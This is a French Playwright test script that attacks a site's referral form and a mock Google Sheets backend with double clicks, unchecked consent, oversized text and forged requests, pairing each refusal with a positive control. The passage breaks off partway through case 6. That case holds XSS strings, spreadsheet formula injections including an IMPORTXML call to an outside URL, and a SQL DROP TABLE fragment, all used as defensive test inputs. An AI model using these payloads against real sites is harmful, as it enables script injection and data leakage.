/* ============================================================
   L'ATTAQUE DU PROGRAMME DE RÉFÉRENCE — `node tools/reference-attaque.mjs`

   CE QU'IL CHERCHE. Pas la preuve que le parcours dessiné marche —
   `acceptation-check`, `prime-check`, `securite-check` et
   `cas-tordus-check` s'en chargent. Celui-ci cherche ce qui CASSE :
   le double clic, la case décochée à la dernière seconde, le texte
   de 10 000 signes collé depuis un courriel, la formule glissée
   dans un nom d'entreprise, l'onglet qu'on recharge au milieu, et
   la requête fabriquée à la main qui ne voit jamais le formulaire.

   TROIS RÈGLES DE FABRICATION, ET ELLES VIENNENT DE `CLAUDE.md` :

   1 · CHAQUE REFUS A SON TÉMOIN POSITIF. Un « le service refuse »
       ne vaut rien tant qu'on n'a pas montré que le MÊME envoi,
       corrigé sur le seul point attaqué, PASSE. Sans ça, une faute
       de frappe dans la charge utile se lit comme une défense.

   2 · UN OUTIL QUI REND « 0 » SANS ERREUR MENT. Toute sonde qui ne
       trouve rien prouve d'abord qu'elle sait trouver quelque
       chose : les cibles au pouce ARRÊTENT l'outil si elles
       mesurent toutes zéro, et le contrôle des formules commence
       par en écrire une vraie et vérifier que le banc la voit.

   3 · UN TEST PEUT VERROUILLER LE DÉFAUT. Les trois gardes qui
       comptent le plus sont rejouées DÉSARMÉES, et elles doivent
       alors tomber. Deux désarmements se font en mémoire — la
       réponse de `js/main.js` est réécrite à la volée, le dépôt
       n'est pas touché. Le troisième écrit dans `google/Code.gs`,
       le restaure dans un `finally`, et vérifie l'empreinte.

   LE FAUX GOOGLE EST À MOI. L'outil lance SA PROPRE instance de
   `tools/faux-google.mjs` sur un port libre plutôt que d'emprunter
   celle du 8098 : l'état doit repartir de zéro entre deux cas, et
   `getFormulas()` ne se lit que depuis le même processus. Le site,
   lui, est celui qui tourne déjà sur 8099 — en relancer un second
   ne prouverait pas que CELUI qu'on regarde est celui qui répond.

   RÉSERVE, ET ELLE VAUT POUR TOUT LE FICHIER : Chromium sous
   Playwright, machine de bureau Windows. Les relevés en 390 px de
   large ne viennent PAS d'un appareil réel.

   Sorties : 0 tout tient · 1 défaut · 2 l'instrument a dérivé.
   ============================================================ */
import { chromium } from "playwright";
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";
import { fileURLToPath, pathToFileURL } from "node:url";

const ICI = path.dirname(fileURLToPath(import.meta.url));
const RACINE = path.resolve(ICI, "..");
const BASE = process.env.APED_BASE || "http://127.0.0.1:8099";

/* ============================================================
   L'INSTRUMENT

   `arret()` sort en 2, jamais en 1. Un instrument qui a dérivé ne
   rend AUCUN verdict : il ne dit ni « ça tient » ni « ça casse »,
   il dit qu'il n'a pas su regarder. Les confondre ferait passer un
   banc cassé pour un site sain.
   ============================================================ */
let n = 0, ko = 0;
const echecs = [];
function dire(nom, obtenu, attendu, note2) {
  n++;
  const ok = String(obtenu) === String(attendu);
  if (!ok) { ko++; echecs.push(nom); }
  console.log("  " + (ok ? "OK   " : "ECHEC") + " " + nom
    + (ok ? "" : "\n         obtenu  : " + JSON.stringify(obtenu)
             + "\n         attendu : " + JSON.stringify(attendu)
             + (note2 ? "\n         " + note2 : "")));
}
function titre(t) { console.log(""); console.log("--- " + t); }
function note(t) { console.log("       · " + t); }
function arret(pourquoi) {
  console.error("");
  console.error("ARRET — L'INSTRUMENT A DERIVE : " + pourquoi);
  console.error("Aucun verdict n'est rendu.");
  process.exit(2);
}

/* ============================================================
   LE BANC — le VRAI `Code.gs`, sur un port à moi
   ============================================================ */
const fauxUrl = pathToFileURL(path.join(ICI, "faux-google.mjs")).href;
const { gs, etat, services, servir } = await import(fauxUrl);

const srv = servir(0);
await new Promise((r) => srv.once("listening", r));
const PORT_G = srv.address().port;
const GOOGLE = "http://127.0.0.1:" + PORT_G + "/exec";
const ONGLET = gs.SCHEMA.refer.onglet;

/* LA VERSION SE LIT DANS L'ARCHIVE, PAS DANS CET OUTIL. Recopiée
   ici, elle deviendrait fausse à la première révision des
   conditions, et le banc jurerait que tout va bien en testant un
   texte que plus personne n'affiche. */
const VERSION = fs.readdirSync(path.join(RACINE, "conditions"))
  .map((f) => /^reference-(\d{4}-\d{2}-\d{2})\.md$/.exec(f)).filter(Boolean)
  .map((m) => m[1]).sort().pop();
if (!VERSION) arret("aucune archive dans `conditions/` — impossible de savoir quelle version est en vigueur.");

/* Toutes les réponses du service passent par ici : le contrôle des
   prix (cas 15) les relit toutes à la fin. */
const REPONSES = [];

function remise() {
  etat.feuilles.clear();
  etat.courriels.length = 0;
  etat.proprietes = {};
  /* LE CACHE AUSSI, ET C'EST LUI QU'ON OUBLIE. `tropVite` y compte
     les envois : sans remise, le plafond de débit d'un cas ferme
     tous les suivants et l'outil accuse le site. */
  etat.cache = {};
  etat.quota = 100;
  etat.decalageHorloge = 0;
  gs.initialiser();
}
function feuilleRefer() { return etat.feuilles.get(ONGLET); }
function nbLignes() {
  const f = feuilleRefer();
  if (!f) return 0;
  return f.valeurs.slice(1).filter((r) => r.some((c) => c !== "" && c != null)).length;
}
function colonne(t) {
  const f = feuilleRefer();
  return f ? f.valeurs[0].indexOf(t) : -1;
}
function valeur(ligne, t) {
  const i = colonne(t);
  if (i < 0) return "__COLONNE ABSENTE__";
  const r = (feuilleRefer().valeurs[ligne - 1]) || [];
  return String(r[i] == null ? "" : r[i]);
}
/* CE QUE SHEETS A RETENU COMME CALCUL, et rien d'autre.
   `getValues()` rend « =1+1 » SANS son apostrophe : la valeur
   rangée ne peut donc pas distinguer un texte inerte d'une
   formule. Seul `formules` le dit — c'est `getFormulas()`. */
function cellulesCalculees() {
  const f = feuilleRefer();
  return f ? f.formules.size : -1;
}

async function forge(charge) {
  const res = await fetch(GOOGLE, {
    method: "POST",
    headers: { "Content-Type": "text/plain;charset=utf-8" },
    body: JSON.stringify(charge)
  });
  const texte = await res.text();
  REPONSES.push({ ou: "POST", corps: texte });
  try { return JSON.parse(texte); }
  catch (e) { return { success: false, message: "corps illisible : " + texte.slice(0, 120) }; }
}
const sidDe = (nom) => (nom + "0123456789abcdefghijklmnop").replace(/[^A-Za-z0-9_-]/g, "").slice(0, 24);

/* Le jeu complet d'une référence valide, moins ce que chaque cas
   retire. C'est LUI le témoin positif de tous les refus forgés. */
function reference(sid, extra) {
  return Object.assign({
    _form: "refer", _sid: sidDe(sid), _etape: 7, _etapes: 8, _final: true,
    _subject: "Nouvelle reference - site APED",
    entreprise_referee: "ZZ Garage Tremblay",
    contact_reference: "Marie Lavoie, 418 555 0142",
    domaine: "Mécanique", taille: "2 à 10 employés", besoin: "Site web",
    votre_nom: "ZZ Referent", votre_email: "zztest@exemple.ca",
    votre_lien: "Ami ou famille",
    conditions_acceptees: "oui", conditions_version: VERSION
  }, extra || {});
}

console.log("============================================================");
console.log("L'ATTAQUE DU PROGRAMME DE RÉFÉRENCE");
console.log("  site    : " + BASE);
console.log("  service : " + GOOGLE + "   (instance privée, remise à zéro entre les cas)");
console.log("  version des conditions en vigueur : " + VERSION);
console.log("============================================================");

try {
  const t = await fetch(BASE + "/index.html");
  if (!t.ok) arret("le site répond " + t.status + " sur " + BASE);
} catch (e) {
  arret("le site ne répond pas sur " + BASE + " — lancez `node tools/serve.mjs 8099`. (" + e.message + ")");
}

/* ============================================================
   LE NAVIGATEUR

   `js/config.local.js` EST INTERCEPTÉ, PAS RÉÉCRIT. Écrire le vrai
   fichier depuis un outil de mesure écraserait la configuration de
   celui qui le lance, et il ne s'en apercevrait qu'à la prochaine
   mise en ligne. Et poser `window.APED_ENVOI` par `addInitScript`
   ne marche PAS : ce script tourne AVANT les fichiers de la page,
   donc `config.local.js`, chargé ensuite, écrase la valeur avec la
   sienne — les envois partiraient vers le vrai Google. (D-742)
   ============================================================ */
const nav = await chromium.launch();

async function ouvrir(options) {
  const o = options || {};
  const ctx = await nav.newContext({
    viewport: { width: o.largeur || 1440, height: o.hauteur || 950 }
  });
  const page = await ctx.newPage();

  const erreurs = [];     /* exceptions JS : toujours zéro */
  const reseau = [];      /* échecs de requête : attendus quand on coupe exprès */
  const dialogues = [];   /* un `alert()` ici = du script exécuté */
  const posts = [];       /* tout ce qui part vers le service */

  page.on("console", (m) => {
    if (m.type() !== "error") return;
    (/ERR_|Failed to load resource|net::/.test(m.text()) ? reseau : erreurs).push(m.text());
  });
  page.on("pageerror", (e) => erreurs.push(String(e)));
  page.on("dialog", (d) => { dialogues.push(d.type() + " : " + d.message()); d.dismiss().catch(() => {}); });
  page.on("request", (r) => {
    if (r.method() !== "POST") return;
    if (r.url().indexOf(":" + PORT_G) === -1) return;
    let corps = "";
    try { corps = r.postData() || ""; } catch (e) {}
    posts.push(corps);
  });
  page.on("response", async (r) => {
    if (r.url().indexOf(":" + PORT_G) === -1) return;
    try { REPONSES.push({ ou: "navigateur", corps: (await r.text()).slice(0, 4000) }); } catch (e) {}
  });

  await page.route("**/js/config.local.js", (route) => route.fulfill({
    status: 200, contentType: "text/javascript; charset=utf-8",
    body: `window.APED_ENVOI = ${JSON.stringify(GOOGLE)};\n`
  }));

  /* `js/main.js` peut être servi DÉSARMÉ, pour prouver qu'une garde
     mord vraiment. Le fichier du dépôt n'est jamais touché : on
     réécrit la RÉPONSE, pas le disque. */
  if (o.desarmer) {
    const brut = await (await fetch(BASE + "/js/main.js")).text();
    const patche = o.desarmer(brut);
    if (patche === brut) {
      arret("le désarmement de `js/main.js` n'a rien changé — l'ancre a bougé, "
        + "et le cas prouverait exactement l'inverse de ce qu'il annonce.");
    }
    await page.route("**/js/main.js", (route) => route.fulfill({
      status: 200, contentType: "text/javascript; charset=utf-8", body: patche
    }));
  }

  await page.addInitScript(() => {
    try {
      /* Le popup cadeau s'ouvre en `showModal()` et capture tous les
         événements de pointeur : sans ça chaque clic expire et
         accuse le mauvais coupable. (piège 18) */
      sessionStorage.setItem("aped-sans-popup", "1");
      sessionStorage.setItem("aped-entree-saut", "1");
      /* LA RETENUE EST MISE HORS-JEU, ET IL FAUT LE DIRE. Elle
         s'ouvre à la FERMETURE d'une modale — c'est-à-dire au beau
         milieu du cas 7 — et son formulaire poste une requête de
         plus, avec le MÊME `_sid`. Elle fausserait le comptage sans
         rien apprendre sur la référence. Ce n'est pas elle qu'on
         attaque ici ; `retenue-check.mjs` s'en charge. */
      localStorage.setItem("aped-retenue-vue", "1");
    } catch (e) {}
  });

  await page.goto(BASE + "/index.html", { waitUntil: "load" });
  await pret(page);
  return { ctx, page, erreurs, reseau, dialogues, posts };
}

/* ON N'ATTEND PAS UNE DURÉE, ON ATTEND UN SIGNAL. `dataset.idle`
   n'est posé sur `#referNext` que par `goRStep()` : sa présence
   prouve que la vague 1 a tourné. Le délai qui suit couvre la
   vague 2 (1,2 s) et `data-palier`, qui arrive après et change la
   peinture. (piège 87) */
async function pret(page) {
  try {
    await page.waitForFunction(() => {
      const b = document.getElementById("referNext");
      return !!(b && b.dataset && b.dataset.idle);
    }, null, { timeout: 15000 });
  } catch (e) {
    arret("`js/main.js` n'a jamais branché l'assistant de référence (`#referNext[data-idle]` absent).");
  }
  await page.waitForTimeout(2600);
}
async function palier(page) {
  return page.evaluate(() => document.documentElement.getAttribute("data-palier"));
}

/* ON CLIQUE PAR `evaluate`, ET C'EST DÉLIBÉRÉ.  D-754 / D-773
   `css/base.css` pose `scroll-behavior: smooth`. Playwright refait
   SON propre défilement avant chaque clic ; le bouton oscille de
   quatre centièmes de pixel et l'outil attend pour toujours sur un
   bouton parfaitement fonctionnel. On vérifie donc soi-même qu'il
   est atteignable — `atteignable()` — puis on l'active. */
async function atteignable(page, sel) {
  return page.evaluate((s) => {
    const el = document.querySelector(s);
    if (!el) return { existe: false };
    el.scrollIntoView({ block: "center", behavior: "instant" });
    const r = el.getBoundingClientRect();
    const dessus = document.elementsFromPoint(r.x + r.width / 2, r.y + r.height / 2);
    return {
      existe: true, desactive: !!el.disabled,
      taille: Math.round(r.width) + "x" + Math.round(r.height),
      premier: dessus.length ? (dessus[0] === el || el.contains(dessus[0])) : false,
      recouvertPar: dessus.length ? (dessus[0].id || dessus[0].className || dessus[0].tagName) : "(hors écran)"
    };
  }, sel);
}
async function cliquer(page, sel) {
  await page.evaluate((s) => { const e = document.querySelector(s); if (e) e.click(); }, sel);
  await page.waitForTimeout(220);
}
async function ouvrirRefer(page) {
  await page.evaluate(() => {
    document.querySelectorAll(".modal").forEach((m) => { m.hidden = true; });
    const b = document.querySelector('[data-modal-open="modal-refer"]');
    if (b) b.click();
  });
  await page.waitForTimeout(400);
}
async function fermerRefer(page) {
  await page.evaluate(() => {
    const b = document.querySelector('#modal-refer .modal-head [data-modal-close]');
    if (b) b.click();
  });
  await page.waitForTimeout(400);
}
async function ecran(page) {
  return page.evaluate(() => {
    const s = [...document.querySelectorAll('#modal-refer .step[data-rstep]')].find((x) => !x.hidden);
    return s ? Number(s.dataset.rstep) : 0;
  });
}
async function poser(page, valeurs) {
  await page.evaluate((v) => {
    Object.keys(v).forEach((id) => {
      const e = document.getElementById(id);
      if (!e) return;
      if (e.type === "checkbox") e.checked = !!v[id];
      else e.value = v[id];
      e.dispatchEvent(new Event("input", { bubbles: true }));
      e.dispatchEvent(new Event("change", { bubbles: true }));
    });
  }, valeurs);
}
async function statut(page) {
  return page.evaluate(() => {
    const s = document.querySelector('#modal-refer .form-status');
    return s ? s.textContent.trim() : "";
  });
}
/* LES CHAMPS FAUTIFS DE L'ÉCRAN VISIBLE, PAS DE TOUTE LA MODALE.
   `is-invalid` reste posée sur les écrans déjà traversés : ramasser
   toute la modale accuserait un écran qu'on ne regarde pas. */
async function champsFautifs(page) {
  return page.evaluate(() =>
    [...document.querySelectorAll('#modal-refer .step[data-rstep]:not([hidden]) .field.is-invalid')]
      .map((f) => { const i = f.querySelector("input,select,textarea"); return i ? (i.id || i.name) : "?"; }));
}

/* Les réponses minimales de chaque écran, pour aller au bout. */
const JEU = {
  1: { rfCompany: "ZZ Garage Tremblay" },
  2: { rfIndustry: "Mécanique", rfNeed: "Site web" },
  3: { rfContact: "Marie Lavoie, 418 555 0142", rfSizeRef: "2 à 10 employés" },
  4: { rfName: "ZZ Referent", rfEmail: "zztest@exemple.ca", rfRelation: "Ami ou famille" },
  5: { rfOwnCompany: "ZZ Referent inc", rfPay: "Chèque" },
  6: { rfPresentation: "Dites que ça vient de moi.", rfMsg: "Elle refait sa devanture." }
};
/* Traverse les écrans `de` → `vers`, en remplissant au passage. */
async function traverser(page, de, vers, remplacements) {
  for (let e = de; e < vers; e++) {
    await poser(page, Object.assign({}, JEU[e] || {}, (remplacements || {})[e] || {}));
    await cliquer(page, "#referNext");
    const ou = await ecran(page);
    if (ou !== e + 1) return { bloque: true, ecran: ou, attendu: e + 1 };
  }
  return { bloque: false, ecran: await ecran(page) };
}

/* ============================================================
   PARTIE I — PAR LE NAVIGATEUR
   ============================================================ */
console.log("");
console.log("############################################################");
console.log("PARTIE I · PAR LE NAVIGATEUR");
console.log("############################################################");

/* ------------------------------------------------------------
   1 · L'ENVOI SANS LA CASE

   DEUX PREUVES, PAS UNE. « Refusé à l'écran » et « rien n'est
   parti » ne sont pas la même chose : un site peut très bien
   afficher un refus APRÈS avoir posté. On compte les requêtes.
   ------------------------------------------------------------ */
titre("1 · L'ÉCRAN 7 SANS LA CASE — refusé à l'écran ET rien au réseau");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("impossible d'atteindre l'écran 7 : bloqué à " + t.ecran + " (attendu " + t.attendu + ").");
  dire("on est bien sur le dernier écran", t.ecran, 7);

  const bouton = await atteignable(page, "#referNext");
  dire("le bouton d'envoi est atteignable", bouton.premier && !bouton.desactive, true, JSON.stringify(bouton));

  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(900);

  dire("on reste sur l'écran 7", await ecran(page), 7);
  const fautifs = await champsFautifs(page);
  dire("la case est signalée comme fautive", fautifs.indexOf("rfAccept") !== -1, true,
    "champs marqués : " + JSON.stringify(fautifs));
  dire("AUCUNE requête n'est partie", posts.length - avant, 0,
    "afficher un refus après avoir posté ne protège de rien · "
    + JSON.stringify(posts.slice(avant).map((p) => p.slice(0, 80))));
  dire("une seule ligne, celle ouverte à l'écran 1", nbLignes(), 1);
  dire("et son acceptation est vide", valeur(2, "Conditions acceptées"), "");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  note("data-palier au moment du verdict : " + await palier(page));
  await ctx.close();
}

titre("1bis · TÉMOIN POSITIF — le même parcours, case cochée, PASSE");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("témoin positif : bloqué à l'écran " + t.ecran + ".");
  await poser(page, { rfAccept: true });
  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1600);

  dire("l'écran de succès paraît", await ecran(page), 8, "message : « " + await statut(page) + " »");
  dire("UNE requête est partie", posts.length - avant, 1);
  dire("une seule ligne au classeur", nbLignes(), 1);
  dire("la colonne dit « oui »", valeur(2, "Conditions acceptées"), "oui");
  dire("la version est rangée", valeur(2, "Version acceptée"), VERSION);
  dire("l'heure du serveur est posée", valeur(2, "Acceptées le").length > 0, true,
    "lu : " + valeur(2, "Acceptées le"));
  dire("l'étape est marquée complète", valeur(2, "Étape").indexOf("✓"), 0,
    "lu : " + valeur(2, "Étape"));
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   2 · LE DOUBLE CLIC

   Deux clics dans la MÊME image : c'est le geste d'un pouce nerveux
   sur un téléphone lent. Un `dblclick` de Playwright laisse passer
   une image entre les deux et ne prouve pas la même chose.
   ------------------------------------------------------------ */
titre("2 · DEUX CLICS SUR « ENVOYER MA RÉFÉRENCE » — une seule ligne");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("double clic : bloqué à l'écran " + t.ecran + ".");
  await poser(page, { rfAccept: true });
  const avant = posts.length;
  await page.evaluate(() => {
    const b = document.getElementById("referNext");
    b.click(); b.click();
  });
  await page.waitForTimeout(1800);

  dire("UNE seule requête est partie", posts.length - avant, 1,
    "le bouton se désactive dès le premier clic · "
    + JSON.stringify(posts.slice(avant).map((p) => p.slice(0, 60))));
  dire("UNE seule ligne au classeur", nbLignes(), 1);
  dire("l'écran de succès paraît quand même", await ecran(page), 8);
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   3 · COCHER, DÉCOCHER, ENVOYER
   ------------------------------------------------------------ */
titre("3 · COCHÉE PUIS DÉCOCHÉE — refusée");
{
  remise();
  const { ctx, page, erreurs, posts } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7);
  if (t.bloque) arret("cocher/décocher : bloqué à l'écran " + t.ecran + ".");
  await poser(page, { rfAccept: true });
  await poser(page, { rfAccept: false });
  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(900);

  dire("on reste sur l'écran 7", await ecran(page), 7);
  dire("aucune requête n'est partie", posts.length - avant, 0);
  dire("la case est signalée", (await champsFautifs(page)).indexOf("rfAccept") !== -1, true);
  dire("rien n'est écrit dans la colonne de preuve", valeur(2, "Conditions acceptées"), "");
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   4 · LES CHAMPS VIDES, ÉCRAN PAR ÉCRAN

   Trois écrans portent une réponse obligatoire : 1 (le nom de
   l'entreprise), 3 (qui contacter), 4 (le référent). On exige DEUX
   choses à chaque fois : le passage est bloqué, ET le champ fautif
   est nommé. Un blocage muet est un formulaire mort.
   ------------------------------------------------------------ */
titre("4 · LES ÉCRANS OBLIGATOIRES REFUSENT LE VIDE, ET DISENT LEQUEL");
{
  remise();
  const { ctx, page, erreurs } = await ouvrir();
  await ouvrirRefer(page);

  await cliquer(page, "#referNext");
  dire("écran 1 · vide, on ne passe pas", await ecran(page), 1);
  dire("écran 1 · le champ fautif est nommé", (await champsFautifs(page)).join(","), "rfCompany");
  dire("écran 1 · le focus est allé dessus",
    await page.evaluate(() => document.activeElement && document.activeElement.id), "rfCompany");

  await poser(page, { rfCompany: "   " });
  await cliquer(page, "#referNext");
  dire("écran 1 · trois espaces ne valent pas un nom", await ecran(page), 1);

  await poser(page, JEU[1]);
  await cliquer(page, "#referNext");
  dire("écran 1 · rempli, on passe", await ecran(page), 2);

  /* TÉMOIN POSITIF DU CAS. L'écran 2 n'a que des questions
     optionnelles : il DOIT laisser passer vide. Sans ce contrôle,
     « bloqué » pourrait venir d'un formulaire qui bloque partout. */
  await cliquer(page, "#referNext");
  dire("écran 2 · tout optionnel, il laisse passer vide", await ecran(page), 3);

  await cliquer(page, "#referNext");
  dire("écran 3 · vide, on ne passe pas", await ecran(page), 3);
  dire("écran 3 · le champ fautif est nommé", (await champsFautifs(page)).join(","), "rfContact");
  await poser(page, JEU[3]);
  await cliquer(page, "#referNext");
  dire("écran 3 · rempli, on passe", await ecran(page), 4);

  await cliquer(page, "#referNext");
  dire("écran 4 · vide, on ne passe pas", await ecran(page), 4);
  const f4 = await champsFautifs(page);
  dire("écran 4 · les trois obligatoires sont nommés",
    f4.join(","), "rfName,rfEmail,rfRelation", "marqués : " + JSON.stringify(f4));
  dire("écran 4 · le téléphone facultatif n'est PAS accusé", f4.indexOf("rfPhone"), -1);

  await poser(page, { rfName: "ZZ Referent", rfEmail: "pas-une-adresse", rfRelation: "Ami ou famille" });
  await cliquer(page, "#referNext");
  dire("écran 4 · « pas-une-adresse » est refusée", await ecran(page), 4);
  dire("écran 4 · et c'est le courriel qu'on accuse", (await champsFautifs(page)).join(","), "rfEmail");

  await poser(page, JEU[4]);
  await cliquer(page, "#referNext");
  dire("écran 4 · corrigé, on passe", await ecran(page), 5);
  dire("aucune erreur console", erreurs.length, 0, erreurs.slice(0, 2).join(" | "));
  await ctx.close();
}

/* ------------------------------------------------------------
   4bis · LE TÉLÉPHONE FACULTATIF À MOITIÉ TAPÉ

   Le champ est annoncé « (optionnel) » et `validate()` sort avant
   de le juger : `if (!input.required) { markField(field, true);
   return; }`. Le SERVEUR, lui, compte les chiffres de
   `votre_telephone` et refuse en dessous de dix, facultatif ou
   non. Quelqu'un qui commence à taper « 418 » puis passe à autre
   chose se fait donc refuser sa référence ENTIÈRE, trois écrans
   plus loin, par un message qui ne nomme aucun champ.

   C'est exactement le « pire des deux mondes » que le commentaire
   de D-771 dit vouloir éviter dans `Code.gs`.
   ------------------------------------------------------------ */
/* CORRIGE LE 2026-08-07 (D-773), ET CE CAS A ETE RETOURNE.

   Il affirmait « les ecrans laissent passer 418 » — c'est-a-dire
   qu'il DECRIVAIT le defaut pour en montrer la suite. Un cas ecrit
   comme ca verrouille le defaut : le jour ou on corrige, c'est le
   TEST qui tombe. Il dit maintenant ce qu'on veut, pas ce qu'on
   avait — l'ecran refuse tout de suite, et il designe le bon
   champ. */
titre("4bis · UN TÉLÉPHONE FACULTATIF À MOITIÉ TAPÉ (écran 4)");
{
  remise();
  const { ctx, page, posts } = await ouvrir();
  await ouvrirRefer(page);
  const avantEcrans = posts.length;
  const t = await traverser(page, 1, 7, { 4: Object.assign({}, JEU[4], { rfPhone: "418" }) });
  dire("l'écran 4 refuse tout de suite", t.bloque, true,
    "un champ facultatif REMPLI se juge quand même");
  dire("et on reste sur l'écran où le champ se trouve", t.ecran, 4,
    "refuser trois écrans plus loin est le pire des deux mondes");
  const marques = await champsFautifs(page);
  dire("c'est le téléphone qu'on accuse", marques.indexOf("rfPhone") !== -1, true,
    "champs marqués : " + JSON.stringify(marques));
  /* LES SAUVEGARDES D'ETAPE, ELLES, PARTENT — c'est tout l'interet
     de la sauvegarde progressive. Ce qui ne doit PAS partir, c'est
     un envoi FINAL : un refus a l'ecran ne confirme rien. */
  dire("aucun envoi FINAL n'est parti",
    posts.filter((c) => { try { return !!JSON.parse(c)._final; } catch (e) { return false; } }).length, 0,
    "un refus a l’ecran ne confirme rien");

  /* ET VIDE PASSE TOUJOURS. Sans ce temps, on aurait pu rendre le
     champ OBLIGATOIRE au lieu de le valider — ce qui casserait
     D-771, qui existe pour qu'un référent bénévole ne paie pas le
     champ le plus cher du site. */
  await poser(page, { rfPhone: "" });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(600);
  dire("laissé VIDE, il passe", await ecran(page), 5,
    "facultatif veut dire « tu peux ne rien mettre », pas « tu peux mettre n'importe quoi »");
  await ctx.close();
}

/* ------------------------------------------------------------
   4ter · « Marie Lavoie, bureau 12 »

   `contact_reference` est annoncé « nom et courriel OU téléphone ».
   Le commentaire de `valider()` dit qu'on ne le juge « que s'il
   ressemble à un numéro » — mais le code teste la présence d'AU
   MOINS UN chiffre, pas la ressemblance. Un numéro de local, un
   rang, un « 2e étage » suffisent à le faire lire comme un
   téléphone incomplet.
   ------------------------------------------------------------ */
titre("4ter · UNE PERSONNE À CONTACTER QUI PORTE UN CHIFFRE SANS ÊTRE UN NUMÉRO");
{
  remise();
  const { ctx, page } = await ouvrir();
  await ouvrirRefer(page);
  const t = await traverser(page, 1, 7,
    { 3: Object.assign({}, JEU[3], { rfContact: "Marie Lavoie, bureau 12" }) });
  dire("les écrans laissent passer", t.bloque, false, "bloqué à l'écran " + t.ecran);
  await poser(page, { rfAccept: true });
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1800);
  dire("la référence aboutit", await ecran(page), 8,
    "sinon : « bureau 12 » se lit comme un téléphone incomplet · « " + await statut(page) + " »");
  await ctx.close();
}

/* ------------------------------------------------------------
   5 · DIX MILLE SIGNES

   Aucun `maxlength` sur les deux zones de texte. Le serveur, lui,
   plafonne `presentation` à 1 000 signes et `contexte` à 3 000.
   Deux questions : est-ce que ça casse, et est-ce que le visiteur
   sait QUOI corriger.
   ------------------------------------------------------------ */
titre("5 · DIX MILLE SIGNES DANS « présentation » ET « contexte »");
{
  /* RETOURNE LE 2026-08-07 (D-773), COMME LE 4bis.

     Il affirmait « les ecrans laissent passer le texte long » et
     « la reference aboutit » — deux facons de decrire l'etat qu'on
     voulait corriger. Depuis : `maxlength` borne la saisie humaine,
     `validate()` borne le collage pose par script, et le service
     NOMME le champ quand il refuse quand meme. Le cas dit
     maintenant les trois. */
  remise();
  const { ctx, page, posts } = await ouvrir();
  await ouvrirRefer(page);
  const long = "A".repeat(10000);
  dire("la charge fait bien 10 000 signes", long.length, 10000);

  const avantEcrans = posts.length;
  const t = await traverser(page, 1, 7, { 6: { rfPresentation: long, rfMsg: long } });
  dire("l'écran 6 refuse le texte trop long", t.bloque, true,
    "bloqué à l'écran " + t.ecran);
  const marques = await champsFautifs(page);
  dire("et il marque le champ fautif", marques.length > 0, true,
    "champs marqués : " + JSON.stringify(marques));
  dire("aucun envoi FINAL n'est parti",
    posts.filter((c) => { try { return !!JSON.parse(c)._final; } catch (e) { return false; } }).length, 0,
    "les sauvegardes d’etape partent, c’est voulu ; la confirmation, non");
  dire("le texte du visiteur n'est pas perdu",
    (await page.inputValue("#rfPresentation")).length > 0, true,
    "on refuse, on n'efface pas");

  /* LE SERVICE NOMME LE CHAMP, LUI AUSSI. Le navigateur est
     contournable ; c'est la reponse du service qu'on lit quand une
     requete est forgee, et « une des reponses est trop longue » ne
     dit rien a personne. */
  const rep = await forge(reference("sidLong", { presentation: long }));
  dire("le service refuse la requête forgée", rep.success, false, rep.message);
  dire("… en nommant le champ et sa borne",
    /trop longue\s*:\s*\d+\s+signes\s+pour\s+\d+/.test(String(rep.message)), true,
    "« " + rep.message + " »");

  /* ET LE TEMOIN : un texte DANS la borne passe. Sans lui, on
     aurait pu casser la zone de texte au lieu de la borner. */
  const rep2 = await forge(reference("sidCourt", { presentation: "A".repeat(900) }));
  dire("un texte de 900 signes passe", rep2.success, true, rep2.message || "");
  await ctx.close();
}

/* ------------------------------------------------------------
   6 · LES SIGNES QUI MORDENT

   Injection HTML, formules Sheets, RTL, émojis. Trois exigences :
   rien ne s'exécute, rien ne casse, et ce qui part est EXACTEMENT
   ce qui a été tapé — c'est au CLASSEUR de rendre le texte inerte,
   pas au site de mutiler ce que le visiteur écrit.
   ------------------------------------------------------------ */
titre("6 · INJECTION, FORMULES, RTL, ÉMOJIS — par le formulaire");
{
  remise();
  const { ctx, page, erreurs, dialogues, posts } = await ouvrir();
  await ouvrirRefer(page);

  const P = {
    entreprise: '<script>alert(1)</script> ZZ',
    domaine: '"><img src=x onerror=alert(1)>',
    societe: "+41255",
    presentation: "=1+1 · -cmd · @import · '; DROP TABLE Referrals;-- 😀🔧 ‮evil‬",
    contexte: '=IMPORTXML("https://x"&B2,"//a") · @SUM(A1) · «guillemets» — éèêç \\back\\ ;;;'
  };
  const t = await traverser(page, 1, 7, {
    1: { rfCompany: P.entreprise },
    2: { rfIndustry: P.domaine, rfNeed: "Site web" },
    5: { rfOwnCompany: P.societe, rfPay: "Chèque" },
    6: { rfPresentation: P.presentation, rfMsg: P.contexte }
  });
  dire("les écrans traversent les charges tordues", t.bloque, false, "bloqué à l'écran " + t.ecran);
  dire("rien n'a été interprété comme du HTML",
    await page.evaluate(() => !!document.querySelector("#modal-refer script, #modal-refer img")), false);
  dire("aucune boîte de dialogue avant l'envoi", dialogues.length, 0, dialogues.join(" | "));

  await poser(page, { rfAccept: true });
  const avant = posts.length;
  await cliquer(page, "#referNext");
  await page.waitForTimeout(1800);

  dire("la référence aboutit", await ecran(page), 8, "message : « " + await statut(page) + " »");
  let c = {};
